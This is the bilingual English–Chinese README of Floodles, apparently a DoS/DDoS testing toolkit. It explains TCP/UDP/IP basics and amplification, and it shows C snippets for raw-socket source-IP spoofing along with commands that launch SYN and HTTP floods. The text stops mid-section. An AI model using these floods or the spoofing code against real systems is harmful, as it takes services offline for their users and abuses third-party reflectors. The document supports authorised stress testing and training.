<div align="center">

# Floodles
# Floodles（项目名）

**Modular DoS/DDoS testing toolkit. 19 attack vectors across L3/L4/L7.**

[![CI](https://github.com/franckferman/Floodles/actions/workflows/ci.yml/badge.svg)](https://github.com/franckferman/Floodles/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-AGPL--3.0-blue?style=flat-square)](LICENSE)

</div>

---

## Table of Contents
## 目录

1. [Overview](#1-overview)
1. [概述](#1-overview)
2. [Network Fundamentals](#2-network-fundamentals)
2. [网络基础知识](#2-network-fundamentals)
   - 2.1 [TCP — Connection-Oriented Protocol](#21-tcp--connection-oriented-protocol)
   - 2.1 [TCP——面向连接的协议](#21-tcp--connection-oriented-protocol)
   - 2.2 [UDP — Stateless and Connectionless](#22-udp--stateless-and-connectionless)
   - 2.2 [UDP — 无状态和无连接](#22-udp--stateless-and-connectionless)
   - 2.3 [IP and Raw Sockets](#23-ip-and-raw-sockets)
   - 2.3 [IP 和原始套接字](#23-ip-and-raw-sockets)
   - 2.4 [What Is a Network Packet](#24-what-is-a-network-packet)
   - 2.4 [什么是网络数据包](#24-what-is-a-network-packet)
   - 2.5 [PPS, Bandwidth, and RPS](#25-pps-bandwidth-and-rps)
   - 2.5 [PPS、带宽和 RPS](#25-pps-bandwidth-and-rps)
3. [Floodles Architecture](#3-floodles-architecture)
3. [Floodles 架构](#3-floodles-architecture)
   - 3.1 [Stack Layers](#31-stack-layers)
   - 3.1 [堆栈层](#31-stack-layers)
   - 3.2 [Native Backends](#32-native-backends)
   - 3.2 [原生后端](#32-native-backends)
   - 3.3 [Why Multiple Languages](#33-why-multiple-languages)
   - 3.3 [为什么使用多种语言](#33-why-multiple-languages)
4. [Layer 3/4 Modules — Network and Transport](#4-layer-34-modules--network-and-transport)
4. [Layer 3/4 模块 — 网络和传输](#4-layer-34-modules--network-and-transport)
   - 4.1 [SYN Flood (UFOSYN)](#41-syn-flood-ufosyn)
   - 4.1 [SYN 泛洪 (UFOSYN)](#41-syn-flood-ufosyn)
   - 4.2 [ACK Flood (UFOACK)](#42-ack-flood-ufoack)
   - 4.2 [ACK 洪泛 (UFOACK)](#42-ack-flood-ufoack)
   - 4.3 [RST/FIN Flood (UFORST)](#43-rstfin-flood-uforst)
   - 4.3 [RST/FIN 洪泛 (UFORST)](#43-rstfin-flood-uforst)
   - 4.4 [XMAS Flood](#44-xmas-flood)
   - 4.4 [XMAS 泛洪](#44-xmas-flood)
   - 4.5 [UDP Flood (UFOUDP)](#45-udp-flood-ufoudp)
   - 4.5 [UDP 泛洪 (UFOUDP)](#45-udp-flood-ufoudp)
   - 4.6 [ICMP Flood (PINGER)](#46-icmp-flood-pinger)
   - 4.6 [ICMP 泛洪 (PINGER)](#46-icmp-flood-pinger)
   - 4.7 [SYN-ACK Flood (TACHYON)](#47-syn-ack-flood-tachyon)
   - 4.7 [SYN-ACK 洪泛 (TACHYON)](#47-syn-ack-flood-tachyon)
   - 4.8 [IP Fragmentation (DROPER)](#48-ip-fragmentation-droper)
   - 4.8 [IP 分片 (DROPER)](#48-ip-fragmentation-droper)
   - 4.9 [Fragment Overlap (OVERLAP)](#49-fragment-overlap-overlap)
   - 4.9 [片段重叠（OVERLAP）](#49-fragment-overlap-overlap)
5. [Amplification Modules — DRDoS](#5-amplification-modules--drdos)
5. [放大模块 — DRDoS](#5-amplification-modules--drdos)
   - 5.1 [Understanding Amplification](#51-understanding-amplification)
   - 5.1 [理解放大](#51-understanding-amplification)
   - 5.2 [SNMP Reflection (SNIPER)](#52-snmp-reflection-sniper)
   - 5.2 [SNMP 反射（SNIPER）](#52-snmp-reflection-sniper)
   - 5.3 [NTP Amplification (MONLIST)](#53-ntp-amplification-monlist)
   - 5.3 [NTP 放大 (MONLIST)](#53-ntp-amplification-monlist)
   - 5.4 [DNS Amplification](#54-dns-amplification)
   - 5.4 [DNS 放大](#54-dns-amplification)
   - 5.5 [Smurf Attack](#55-smurf-attack)
   - 5.5 [蓝精灵攻击](#55-smurf-attack)
   - 5.6 [Fraggle Attack](#56-fraggle-attack)
   - 5.6 [Fraggle 攻击](#56-fraggle-attack)
   - 5.7 [Multi-Vector (SPRAY)](#57-multi-vector-spray)
   - 5.7 [多向量（SPRAY）](#57-multi-vector-spray)
6. [Layer 7 Modules — Application](#6-layer-7-modules--application)
6. [Layer 7 模块 — 应用程序](#6-layer-7-modules--application)
   - 6.1 [HTTP Flood (LOIC L7)](#61-http-flood-loic-l7)
   - 6.1 [HTTP 泛洪 (LOIC L7)](#61-http-flood-loic-l7)
   - 6.2 [Slowloris (LORIS)](#62-slowloris-loris)
   - 6.2 [Slowloris (LORIS)](#62-slowloris-loris)
   - 6.3 [Slow POST (RUDY)](#63-slow-post-rudy)
   - 6.3 [慢速 POST (RUDY)](#63-slow-post-rudy)
   - 6.4 [TCP Starvation (NUKE)](#64-tcp-starvation-nuke)
   - 6.4 [TCP 饥饿 (NUKE)](#64-tcp-starvation-nuke)
7. [Tuning Attack Power — Practical Guide](#7-tuning-attack-power--practical-guide)
7. [调整攻击强度-实用指南](#7-tuning-attack-power--practical-guide)
8. [Audit Methodology](#8-audit-methodology)
8. [审计方法](#8-audit-methodology)
9. [Installation and Build](#9-installation-and-build)
9. [安装和构建](#9-installation-and-build)
10. [Full CLI Reference](#10-full-cli-reference)
10. [完整 CLI 参考](#10-full-cli-reference)
11. [Logging and Reporting](#11-logging-and-reporting)
11. [记录和报告](#11-logging-and-reporting)
12. [Performance Benchmarks](#12-performance-benchmarks)
12. [性能基准](#12-performance-benchmarks)
13. [Limitations](#13-limitations)
13. [限制](#13-limitations)
14. [Related Work](#14-related-work)
14. [相关工作](#14-related-work)
15. [References](#15-references)
15. [参考文献](#15-references)

---

## 1. Overview
## 1. 概述

A **Denial-of-Service (DoS)** attack exhausts a target's resources — CPU cycles, memory, connection tables, or network bandwidth — until it can no longer serve legitimate requests. The attacker and the target are typically one-to-one.
**Denial-of-Service (DoS)** 攻击会耗尽目标的资源（CPU 周期、内存、连接表或网络带宽），直到它无法再满足合法请求。攻击者和目标通常是一对一的。

A **Distributed Denial-of-Service (DDoS)** attack coordinates multiple sources against a single target, multiplying the traffic volume and making source-based filtering impossible. A special subclass — **Distributed Reflected DoS (DRDoS)** — exploits third-party servers as unwitting amplifiers: the attacker sends spoofed requests to open reflectors, which send their (much larger) responses to the victim.
**Distributed Denial-of-Service (DDoS)** 攻击针对单个目标协调多个源，从而使流量成倍增加并使基于源的过滤变得不可能。一个特殊的子类 - **Distributed Reflected DoS (DRDoS)** - 利用第三方服务器作为不知情的放大器：攻击者发送源地址伪造的请求以打开反射器，反射器将其（更大的）响应发送给受害者。

Floodles covers all three models across three OSI layers:
Floodles 涵盖三个 OSI 层的所有三个模型：

- **L3/L4** — raw TCP and UDP packet floods (9 vectors, raw socket, root required)
- **L3/L4** — 原始 TCP 和 UDP 数据包泛洪（9 个向量，原始套接字，需要 root）
- **Amplification** — SNMP, NTP, DNS, Smurf, Fraggle, multi-vector (6 vectors, spoofing required)
- **Amplification** — SNMP、NTP、DNS、Smurf、Fraggle、多向量（6 个向量，需要源地址伪造）
- **L7** — HTTP flood, Slowloris, Slow POST, TCP starvation (4 vectors, no root required)
- **L7** — HTTP 泛洪、Slowloris、慢速 POST、TCP 饥饿（4 个向量，无需 root）

**Total: 19 attack vectors** implemented across four language runtimes (Python, C, Rust, Go) with automatic backend selection.
**Total: 19 attack vectors** 跨四种语言运行时（Python、C、Rust、Go）实现，具有自动后端选择功能。

### What DoS tests answer
### DoS 测试能回答什么

Passive scanning identifies open ports and software versions. It cannot answer the questions that matter most:
被动扫描可识别开放端口和软件版本。它无法回答最重要的问题：

- Can an attacker make our services unavailable, and how easily?
- 攻击者能否使我们的服务不可用？有多容易？
- At what traffic volume does the target degrade, and at what volume does it become completely unreachable?
- 在什么流量下目标会降级，在什么流量下目标会变得完全无法访问？
- What is the actual impact — partial degradation, full outage, data corruption, cascading failures?
- 实际影响是什么——部分降级、完全中断、数据损坏、级联故障？
- Are rate limiting and scrubbing mechanisms enabled and genuinely working, or just configured on paper?
- 速率限制和流量清洗机制是否启用并真正起作用，或者只是在纸上配置？
- Can internal equipment (printers, switches, UPS, NTP servers) serve as amplification reflectors against other targets?
- 内部设备（打印机、交换机、UPS、NTP 服务器）能否充当针对其他目标的放大反射器？
- Do IDS/IPS alerts trigger on known attack signatures, or do attacks pass silently for hours?
- IDS/IPS 警报是否会在已知的攻击特征上触发，或者攻击是否会悄无声息地持续数小时？
- What is the recovery time after traffic stops — seconds, minutes, manual intervention required?
- 交通停止后的恢复时间是多少——秒、分钟、需要人工干预？
- Does the upstream anti-DDoS scrub the load before it reaches the origin, or does it leak through?
- 上游 Anti-DDoS 是否会在负载到达源站之前清洗负载，或者是否会泄漏？
- Are we actually vulnerable, or are the mitigations we believe are in place sufficient?
- 我们真的确实存在漏洞吗？还是我们认为已经采取的缓解措施足够了？

These questions have no passive answers. You either test or you assume — and assumptions in a security report are not findings. A "we have anti-DDoS" statement without evidence of what it absorbs is not a security posture.
这些问题没有被动的答案。您要么进行测试，要么进行假设——安全报告中的假设并不是发现。如果没有证据表明“我们有反 DDoS”声明，那么这并不是一种安全态势。

### Lab Environment
### 实验室环境

For a purpose-built test environment, see [DOSArena](https://github.com/franckferman/DOSArena) — the first DoS/DDoS training platform with live proof-of-impact scoring. DOSArena provides 8 attack scenarios across multiple difficulty levels, 15 pre-configured Docker containers (vulnerable targets, judge, monitoring), an automated scoring engine that validates attacks every 5 seconds and issues time-windowed flags, and a Terraform/AWS deployment mode for cloud-scale testing. Floodles is the recommended attack toolkit for DOSArena scenarios.
对于专门构建的测试环境，请参阅 [DOSArena](https://github.com/franckferman/DOSArena) — 第一个具有实时影响证明评分的 DoS/DDoS 培训平台。 DOSArena 提供了 8 个跨多个难度级别的攻击场景、15 个预配置的 Docker 容器（易受攻击的目标、判断、监控）、每 5 秒验证一次攻击并发出时间窗口标志的自动评分引擎，以及用于云规模测试的 Terraform/AWS 部署模式。 Floodles 是 DOSArena 场景推荐的攻击工具包。

---

## 2. Network Fundamentals
## 2. 网络基础知识

### 2.1 TCP — Connection-Oriented Protocol
### 2.1 TCP——面向连接的协议

TCP (RFC 793) guarantees reliable, ordered, error-checked delivery. Every byte sent is acknowledged; lost packets are retransmitted; the receiver controls the rate via the window size. This reliability comes at a cost: TCP maintains state for every connection.
TCP (RFC 793) 保证可靠、有序、经过错误检查的交付。发送的每个字节都会被确认；丢失的数据包被重传；接收器通过窗口大小控制速率。这种可靠性是有代价的：TCP 维护每个连接的状态。

#### The Three-Way Handshake
#### 三次握手

```
Client                              Server
  |                                   |
  |-- SYN (seq=ISN_c) -------------->|  Client picks a random Initial Sequence Number
  |                                   |  Server allocates a TCB, enters SYN_RECEIVED
  |<-- SYN-ACK (seq=ISN_s,          |  Server picks ISN_s, acknowledges ISN_c+1
  |             ack=ISN_c+1) --------|
  |                                   |
  |-- ACK (ack=ISN_s+1) ------------>|  Server moves to ESTABLISHED
  |                                   |
  |<========= Data Transfer =========>|
  |                                   |
  |-- FIN --------------------------->|  Client initiates close
  |<-- FIN-ACK ----------------------|
  |-- ACK --------------------------->|  Both enter TIME_WAIT -> CLOSED
```

#### The TCB — Transmission Control Block
#### TCB：传输控制块

For every connection in `SYN_RECEIVED` or `ESTABLISHED` state, the kernel allocates a **TCB** in memory. A TCB contains:
对于处于 `SYN_RECEIVED` 或 `ESTABLISHED` 状态的每个连接，内核会在内存中分配一个 **TCB** 。 TCB 包含：

```
- Source IP / Destination IP
- Source port / Destination port
- Send sequence number (SND.NXT)
- Receive sequence number (RCV.NXT)
- Receive window size (RCV.WND)
- Congestion window (cwnd)
- Retransmission timer
- Current state (SYN_RECEIVED, ESTABLISHED, FIN_WAIT_1...)
```

On Linux, each TCB consumes approximately 280-350 bytes of kernel memory. The **SYN queue** (incomplete backlog) holds half-open connections waiting for their final ACK. Its capacity is controlled by:
在 Linux 上，每个 TCB 消耗大约 280-350 字节的内核内存。 **SYN queue**（未完成连接队列）保持半打开连接等待其最终 ACK。其容量由以下因素控制：

```bash
sysctl net.ipv4.tcp_max_syn_backlog   # default: 128-1024 depending on distro
```

The **accept queue** (complete backlog) holds fully established connections awaiting `accept()` from the application. Its capacity is the `backlog` parameter of `listen()` (typically 128 by default in most server configs).
**accept queue**（完整连接队列）保留完全建立的连接，等待来自应用程序的 `accept()`。它的容量是 `listen()` 的 `backlog` 参数（在大多数服务器配置中默认情况下通常为 128）。

#### TCP State Machine
#### TCP状态机

```
CLOSED
  -> listen()      -> LISTEN
  -> connect()     -> SYN_SENT -> SYN_RECEIVED -> ESTABLISHED
                                                      |
                                 FIN sent ->    FIN_WAIT_1
                                                      |
                                 FIN-ACK recv -> FIN_WAIT_2
                                                      |
                                 FIN recv ->     TIME_WAIT (2*MSL = 60-120s)
                                                      |
                                                   CLOSED

ESTABLISHED -> FIN recv -> CLOSE_WAIT -> FIN sent -> LAST_ACK -> CLOSED
```

`TIME_WAIT` lasts 2 * MSL (Maximum Segment Lifetime), typically 60-120 seconds. During `TIME_WAIT`, the 4-tuple (src\_ip, src\_port, dst\_ip, dst\_port) cannot be reused. A connection exhaustion attack that fills the TIME_WAIT table continues to deny service for up to 2 minutes after the attack stops.
`TIME_WAIT` 持续 2 * MSL（最大段寿命），通常为 60-120 秒。在 `TIME_WAIT` 期间，4 元组（src\_ip、src\_port、dst\_ip、dst\_port）无法重用。填充 TIME_WAIT 表的连接耗尽攻击在攻击停止后将继续拒绝服务长达 2 分钟。

#### TCP Flags
#### TCP 标志

The 8-bit flags field in the TCP header is the primary lever for attack shaping:
TCP 标头中的 8 位标志字段是攻击流量塑形的主要控制点：

```
Bit 0 (0x01): FIN — no more data from sender
Bit 1 (0x02): SYN — synchronize sequence numbers (initiates connection)
Bit 2 (0x04): RST — reset connection immediately
Bit 3 (0x08): PSH — deliver data to application without buffering
Bit 4 (0x10): ACK — acknowledgement field valid
Bit 5 (0x20): URG — urgent pointer valid
Bit 6 (0x40): ECE — ECN echo
Bit 7 (0x80): CWR — congestion window reduced
```

Each Floodles module manipulates these flags to produce a specific server reaction:
每个 Floodles 模块都会操纵这些标志来产生特定的服务器反应：

| Module | Flags set | Server reaction |
| 模块 | 标志设置 | 服务器反应 |
|--------|-----------|-----------------|
| UFOSYN | SYN (0x02) | Allocates TCB, sends SYN-ACK, waits for ACK that never comes |
| UFOSYN | SYN (0x02) | 分配 TCB，发送 SYN-ACK，等待永远不会到来的 ACK |
| UFOACK | ACK (0x10) | Walks connection table, finds nothing, sends RST |
| UFOACK | ACK (0x10) | 遍历连接表，未找到匹配项，发送 RST |
| UFORST | RST (0x04) | Closes matching established connections |
| UFORST | RST (0x04) | 关闭匹配的已建立连接 |
| XMAS | ALL (0xFF) | Undefined behavior per RFC 793 — varies by OS |
| XMAS | ALL (0xFF) | RFC 793 未定义的行为，因操作系统而异 |
| TACHYON | SYN-ACK (0x12) | RST generated for unsolicited SYN-ACK |
| TACHYON | SYN-ACK (0x12) | 对未经请求的 SYN-ACK 生成 RST |

---

### 2.2 UDP — Stateless and Connectionless
### 2.2 UDP——无状态和无连接

UDP (RFC 768) is an 8-byte header: source port, destination port, length, checksum. No connection, no state, no sequence numbers, no acknowledgements. Every datagram is independent.
UDP (RFC 768) 是一个 8 字节的标头：源端口、目标端口、长度、校验和。没有连接，没有状态，没有序列号，没有确认。每个数据报都是独立的。

When a UDP datagram arrives at the kernel:
当 UDP 数据报到达内核时：

```
Datagram arrives at kernel
        |
        v
Is a socket bound to dst_port?
        |
   YES  |  NO
        |   |
        v   v
  Pass to  Generate ICMP Port Unreachable (type 3, code 3)
  application  toward source IP
```

The **absence of connection state** is both a weakness (no reliability guarantee) and the core enabler of amplification attacks. Because UDP has no handshake, the server cannot distinguish a legitimate datagram from one with a forged source IP. It simply sends its response to whatever `src_ip` appears in the header.
**absence of connection state** 既是弱点（没有可靠性保证），也是放大攻击的核心推动者。由于 UDP 没有握手，因此服务器无法区分合法数据报和伪造源 IP 的数据报。它只是将其响应发送到标头中出现的任何 `src_ip` 。

```
Spoofed UDP datagram:
  IP src  = victim_ip   (forged — kernel on attacker machine writes arbitrary value)
  IP dst  = reflector
  UDP dst = 161 (SNMP)
  Payload = GetBulkRequest (~60 bytes)

Reflector:
  1. Receives datagram
  2. SNMP process on port 161: processes the request legitimately
  3. Sends GetBulkResponse (~40 KB) to src = victim_ip
  -> Victim receives 40 KB it never requested, from a legitimate server IP
```

This is the root cause of every amplification attack in section 5. TCP is immune to this class of attack precisely because its three-way handshake verifies the source IP: the server sends a SYN-ACK and waits for an ACK that only the real source can produce.
这是第 5 节中每次放大攻击的根本原因。 TCP 之所以能免受此类攻击，正是因为它的三次握手会验证源 IP：服务器发送 SYN-ACK 并等待只有真正的源才能产生的 ACK。

---

### 2.3 IP and Raw Sockets
### 2.3 IP 和原始套接字

IP (RFC 791) routes packets from source to destination across networks. The 20-byte IP header contains the fields that matter most for attack construction:
IP (RFC 791) 通过网络将数据包从源路由到目的地。 20 字节的 IP 标头包含对攻击构建最重要的字段：

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |     ToS       |          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Fields used by Floodles attack modules:
Floodles 攻击模块使用的字段：

| Field | Size | Relevance |
| 场地 | 尺寸 | 关联 |
|-------|------|-----------|
| Identification | 16 bits | Set to random value in fragmentation attacks (DROPER) |
| 鉴别 | 16位 | 在分片攻击（DROPER）中设置为随机值 |
| Flags | 3 bits | MF (More Fragments) manipulated in DROPER and OVERLAP |
| 旗帜 | 3位 | 在 DROPER 和 OVERLAP 中操纵 MF（更多片段） |
| Fragment Offset | 13 bits | Set to overlapping values in Teardrop/OVERLAP variants |
| 片段偏移 | 13位 | 在 Teardrop/OVERLAP 变体中设置为重叠值 |
| TTL | 8 bits | Set to 64 (Linux default); decremented at each hop |
| TTL | 8位 | 设置为 64（Linux 默认值）；每跳递减 |
| Protocol | 8 bits | 6=TCP, 17=UDP, 1=ICMP |
| 协议 | 8位 | 6=TCP、17=UDP、1=ICMP |
| Source Address | 32 bits | **Forged to random value for spoofing** |
| 源地址 | 32位 | **Forged to random value for spoofing** |

#### Raw Sockets and IP_HDRINCL
#### 原始套接字和 IP_HDRINCL

A normal socket lets the kernel construct the IP header, including the source IP (always the machine's real IP). A **raw socket with `IP_HDRINCL`** hands full IP header control to the application, including the source address field.
普通套接字让内核构造 IP 标头，包括源 IP（始终是机器的真实 IP）。**带有 `IP_HDRINCL` 的原始套接字**把完整的 IP 标头控制权交给应用程序，包括源地址字段。

This is exactly what `native/c/sender.c` does:
这正是 `native/c/sender.c` 所做的：

```c
// native/c/sender.c — socket setup
int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
int one = 1;
setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
// The application now writes ip->saddr = any value it chooses
```

Source IP randomization uses xorshift64 — a period-2^64 PRNG that takes ~3 CPU cycles per call, fast enough to generate a new random source IP per packet without measurable overhead:
源 IP 随机化使用 xorshift64 — 一个周期为 2^64 的 PRNG，每次调用大约需要 3 个 CPU 周期，速度足以为每个数据包生成新的随机源 IP，而无需可测量的开销：

```c
// native/c/sender.c — xorshift64 PRNG (thread-local state)
static __thread uint64_t _rng_state = 0;

static inline uint64_t fast_rand(void) {
    if (_rng_state == 0) _rng_state = (uint64_t)pthread_self() ^ (uint64_t)time(NULL);
    _rng_state ^= _rng_state << 13;
    _rng_state ^= _rng_state >> 7;
    _rng_state ^= _rng_state << 17;
    return _rng_state;
}
// ip->saddr = (uint32_t)fast_rand();  — random source IP per packet
```

The same algorithm is replicated in `native/rust/src/lib.rs` for the Rust packet builder. Both use thread-local state so there is no lock contention between threads.
Rust 数据包生成器在 `native/rust/src/lib.rs` 中复制了相同的算法。两者都使用线程本地状态，因此线程之间不存在锁争用。

**Raw sockets require `CAP_NET_RAW`**, which in practice means `sudo`. This is why all L3/L4 and amplification modules in Floodles require root privileges.
**原始套接字需要 `CAP_NET_RAW`**，实际使用时通常意味着需要 `sudo`。这就是 Floodles 中所有 L3/L4 和放大模块都需要 root 权限的原因。

#### BCP38 and ISP Spoofing Filters
#### BCP38 和 ISP 源地址伪造过滤器

RFC 2827 (BCP38) recommends that ISPs drop outbound packets with source IPs outside the customer's assigned prefix. Many cloud providers (AWS, DigitalOcean, GCP, Hetzner, OVH) enforce this at the hypervisor level. On such networks, spoofed packets are silently dropped before leaving the host: amplification attacks and most L3/L4 spoofed floods become non-functional. See [section 13](#13-limitations) for full implications.
RFC 2827 (BCP38) 建议 ISP 丢弃源 IP 超出客户指定前缀的出站数据包。许多云提供商（AWS、DigitalOcean、GCP、Hetzner、OVH）在Hypervisor级别强制执行此操作。在此类网络上，源地址伪造的数据包在关闭主机之前会被悄悄丢弃：放大攻击和大多数 L3/L4 源地址伪造的洪流将变得不起作用。请参阅[第 13 节](#13-limitations) 了解完整含义。

---

### 2.4 What Is a Network Packet
### 2.4 什么是网络数据包

A network packet is a layered structure. Each protocol adds its own header, wrapping the one above it:
网络数据包是分层结构。每个协议都添加自己的标头，包装其上方的标头：

```
+--------------------------------------------------+
| Ethernet Header (14 bytes)                       |
|   src_mac (6B) | dst_mac (6B) | ethertype (2B)   |  <- L2, MAC addresses
| +----------------------------------------------+ |
| | IP Header (20 bytes minimum)                 | |
| |   ver | IHL | ToS | total_len | id | flags   | |  <- L3, routing
| |   frag_offset | ttl | proto | checksum       | |
| |   src_ip (4B) | dst_ip (4B)                  | |
| | +------------------------------------------+ | |
| | | TCP Header (20 bytes minimum)            | | |
| | |   src_port (2B) | dst_port (2B)          | | |  <- L4, transport
| | |   seq (4B) | ack (4B)                   | | |
| | |   offset | flags | window | checksum    | | |
| | |   urgent_ptr | [options]                | | |
| | | +--------------------------------------+ | | |
| | | | Payload (0 to ~1460 bytes)           | | | |  <- L7, application data
| | | +--------------------------------------+ | | |
| | +------------------------------------------+ | |
| +----------------------------------------------+ |
+--------------------------------------------------+
```

**A SYN flood packet has zero payload.** It consists only of the IP header (20 bytes) + TCP header (20 bytes) = 40 bytes total, plus the Ethernet frame overhead. This is why a SYN flood can generate enormous PPS counts at modest bandwidth:
**A SYN flood packet has zero payload.** 它仅包含 IP 标头（20 字节）+ TCP 标头（20 字节）= 总共 40 字节，加上以太网帧开销。这就是为什么 SYN 泛洪可以在适度的带宽下生成大量 PPS 计数：

```
40-byte SYN packet = 320 bits
At 1,000,000 PPS: 320,000,000 bits/s = 320 Mbps only
But the server processes 1,000,000 connection setup operations/second
```

The Rust packet builder in `native/rust/src/lib.rs` constructs these headers on the stack — no heap allocation per packet:
`native/rust/src/lib.rs` 中的 Rust 数据包构建器在堆栈上构造这些标头 — 每个数据包没有堆分配：

```rust
// native/rust/src/lib.rs
const MAX_PKT: usize = 1500;

#[repr(C)]
pub struct PacketBuf {
    pub data: [u8; MAX_PKT],  // Stack-allocated, fixed size
    pub len:  u32,
}
// Each packet is exactly 1500 bytes on the stack — no malloc(), no free()
```

**MTU (Maximum Transmission Unit)**: standard Ethernet carries a maximum of 1500 bytes of IP payload. Packets larger than the MTU are fragmented by the kernel (or dropped if DF — Don't Fragment — is set). The fragmentation attacks in section 4.8 and 4.9 deliberately exploit the reassembly process.
**MTU (Maximum Transmission Unit)**：标准以太网承载最多 1500 字节的 IP 有效负载。大于 MTU 的数据包将被内核分段（或者如果设置了 DF — 不分段 — 将被丢弃）。 4.8 和 4.9 节中的分片攻击故意利用重组过程。

---

### 2.5 PPS, Bandwidth, and RPS
### 2.5 PPS、带宽和RPS

Three distinct metrics govern DoS effectiveness, and each targets a different resource:
三个不同的指标控制 DoS 有效性，每个指标针对不同的资源：

| Metric | Full name | Resource targeted | Relevant attack type |
| 公制 | 姓名 | 资源目标 | 相关攻击类型 |
|--------|-----------|-------------------|---------------------|
| PPS | Packets Per Second | CPU / connection table | SYN flood, ACK flood, XMAS |
| 聚苯硫醚 | 每秒数据包数 | CPU/连接表 | SYN 泛洪、ACK 泛洪、XMAS |
| Mbps / Gbps | Megabits per second | Network link / upstream pipe | UDP flood, ICMP flood, amplification |
| Mbps/Gbps | 兆比特每秒 | 网络链路/上游管道 | UDP 泛洪、ICMP 泛洪、放大 |
| RPS | Requests Per Second | Application threads / DB connections | HTTP flood, Slowloris |
| RPS | 每秒请求数 | 应用程序线程/数据库连接 | HTTP 泛洪、Slowloris |

#### PPS vs Bandwidth — the SYN flood example
#### PPS 与带宽 — SYN 泛洪示例

```
SYN packet size: 40 bytes = 320 bits

100,000 PPS x 320 bits = 32 Mbps of bandwidth
-> Consumes only 32% of a 100 Mbps link
-> But forces the server to process 100,000 TCP connection setups/second

At 1,000,000 PPS:
-> 320 Mbps — within reach of a single 1G link
-> Server faces 1 million TCB allocations/second
-> net.ipv4.tcp_max_syn_backlog saturates within milliseconds
```

A server can be completely unreachable at 32 Mbps of SYN traffic. The bottleneck is not bandwidth — it is kernel processing capacity and memory.
在 SYN 流量为 32 Mbps 时，服务器可能完全无法访问。瓶颈不是带宽，而是内核处理能力和内存。

#### Estimating your sender's capability
#### 评估发件人的能力

```
Your uplink: 1 Gbps = 1,000,000,000 bits/s

SYN packet (40 bytes = 320 bits):
  Theoretical max PPS = 1,000,000,000 / 320 = ~3,125,000 PPS
  Practical (65% efficiency, overhead, driver): ~2,000,000 PPS

UDP packet (1400 bytes = 11,200 bits):
  Theoretical max PPS = 1,000,000,000 / 11,200 = ~89,000 PPS
  -> Near bandwidth saturation (1400B x 89,000 = 990 Mbps)
```

Floodles reports both metrics in real time:
Floodles 实时报告这两个指标：

```bash
sudo floodles syn 192.168.1.100 80 -t 8 -d 60
# Dashboard shows: live_pps=820,000  avg_mbps=394  packets=49,200,000
```

#### RPS — the L7 dimension
#### RPS — L7 维度

Application-layer attacks are measured in requests per second. A single HTTP request may consume a database query, disk I/O, template rendering, and multiple downstream API calls. At 10,000 RPS on a poorly optimized application, the server is CPU-bound before any network constraint applies.
应用程序层攻击以每秒请求数来衡量。单个 HTTP 请求可能会消耗数据库查询、磁盘 I/O、模板渲染和多个下游 API 调用。在优化不佳的应用程序上，当速度为 10,000 RPS 时，在应用任何网络约束之前，服务器会受到 CPU 限制。

```bash
floodles http https://target.example.com -c 2000 -d 60
# Dashboard shows: reqs=180,000  ok=150,000  err=30,000  rps=3,000
```

---

## 3. Floodles Architecture
## 3.Floodles架构

### 3.1 Stack Layers
### 3.1 堆栈层

```
+--------------------------------------------------------------+
|  CLI (Click)  |  Rich TUI dashboard  |  JSONL logger        |
+--------------------------------------------------------------+
|  19 attack modules (syn / udp / icmp / http / slow / ...)   |
+--------------------------------------------------------------+
|  native_bridge.py — backend detection and auto-compilation  |
+--------------------+-------------------+--------------------+
|  C sender          |  Rust packets     |  Go engine         |
|  sendmmsg(256)     |  zero-copy        |  goroutines M:N    |
|  ~2M PPS           |  stack alloc      |  HTTP / Slowloris  |
|  xorshift64 PRNG   |  SIMD checksum    |  100k+ concurrent  |
+--------------------+-------------------+--------------------+
|  Python fallback (Scapy) — always available, ~12k PPS       |
+--------------------------------------------------------------+
```

Backend resolution order (from `core/native_bridge.py`):
后端解析顺序（来自 `core/native_bridge.py`）：

```
1. C sender    -> native/c/libsender.so
2. Rust lib    -> native/rust/target/release/libfloodles_packets.so
3. Go engine   -> native/go/floodles-engine
4. Python      -> Scapy (always available, no compilation required)
```

If a native binary is missing but the toolchain is present, `native_bridge.py` auto-compiles it on first run. You can also force compilation explicitly:
如果缺少本机二进制文件但存在工具链，则 `native_bridge.py` 会在首次运行时自动编译它。您还可以显式强制编译：

```bash
floodles detect --compile
```

---

### 3.2 Native Backends
### 3.2 原生后端

#### C — High-Performance Sender (`native/c/sender.c`)
#### C — 高性能发送器 (`native/c/sender.c`)

The fundamental bottleneck of a Python flood is syscall overhead. Each `sendto()` call is one kernel context switch — typically 200-500 nanoseconds of fixed overhead regardless of packet size. At 12,000 PPS (Python/Scapy ceiling), the kernel spends more time switching contexts than sending packets.
Python 泛洪的根本瓶颈是系统调用开销。每个 `sendto()` 调用都是一次内核上下文切换 — 通常需要 200-500 纳秒的固定开销，无论数据包大小如何。在 12,000 PPS（Python/Scapy 上限）下，内核切换上下文的时间比发送数据包的时间还要多。

`sendmmsg()` (Linux 3.0+) batches multiple messages into a single syscall. Floodles uses `BATCH_SIZE = 256`:
`sendmmsg()` (Linux 3.0+) 将多个消息批处理到单个系统调用中。 Floodles 使用 `BATCH_SIZE = 256`：

```c
// native/c/sender.c
#define BATCH_SIZE  256

// Instead of:
